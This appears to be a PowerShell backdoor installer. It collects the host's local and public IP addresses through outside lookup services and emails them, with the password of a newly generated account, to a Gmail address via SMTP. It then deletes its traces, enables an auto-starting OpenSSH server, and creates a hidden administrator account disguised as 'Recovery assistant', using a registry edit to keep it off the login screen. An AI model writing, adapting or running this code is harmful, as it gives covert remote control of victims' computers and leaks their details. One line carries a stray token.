function random_text {
    return -join ((65..69) + (97..112) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}

$STARTDIR = Get-Location
$EMAIL = Get-Content u.txt
$PWORD = Get-Content up.txt
$NEWUSER = random_text
$LPWORD = $(random_text) + $(random_text) + $(random_text)
$LPWORD_S = (ConvertTo-securestring $LPWORD -AsPlainText -Force)
$WORKDIR = random_text
$REGFILE = random_text
$WORKPATH = "$env:temp\\$WORKDIR"
$LIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
$RIP1 = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content)
$RIP2 = (Invoke-WebRequest -Uri 'http://icanhazip.com/').Content
$CONFIG = "$WORKPATH\new.cfg"

mkdir $WORKPATH
attrib -h -s- -r "$WORKPATH"
Set-Location $WORKPATH

Add-Content -Path $CONFIG -Value "$STARTDIR"
Add-Content -Path $CONFIG -Value "$LIP"
Add-Content -Path $CONFIG -Value "$RIP1"
Add-Content -Path $CONFIG -Value "$RIP2"
Add-Content -Path $CONFIG -Value "$NEWUSER"
Add-Content -Path $CONFIG -Value "$LPWORD"
Add-Content -Path $CONFIG -Value "$WORKDIR"

Send-MailMessage -From $EMAIL -To $EMAIL -Subject "$env:UserName" -Attachment $CONFIG -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $EMAIL, (ConvertTo-securestring -String $pword -AsPlainText -Force))PWORD

Remove-Item "$WORKPATH\new.cfg"
Remove-Item "$STARTDIR\u.txt"
Remove-Item "$STARTDIR\up.txt"

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

function create_account {
    [CmdletBinding()]
    param (
        [string] $Username,
        [securestring] $Password
    )
    begin {}
    process {
        New-LocalUser "$NEWUSER" -Password $LPWORD_S -FullName "$NEWUSER" -Description "Recovery assistant"
        Add-LocalGroupMember -Group "Administrators" -Member "$NEWUSER"
    }
    end {}

}
create_account -Username $NEWUSER -Password $LPWORD_S

Set-Location "C:\Users"
attrib -h -s- -r "$NEWUSER"
Set-Location $WORKPATH

$REGF = @"
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList]
"$NEWUSER"=dword:00000000;
"@
$REGF > "$REGFILE.reg"
reg import ".\$REGFILE.reg"
Remove-Item "$REGFILE.reg"





Write-Output "Remove-Item $STARTDIR/installer.ps1"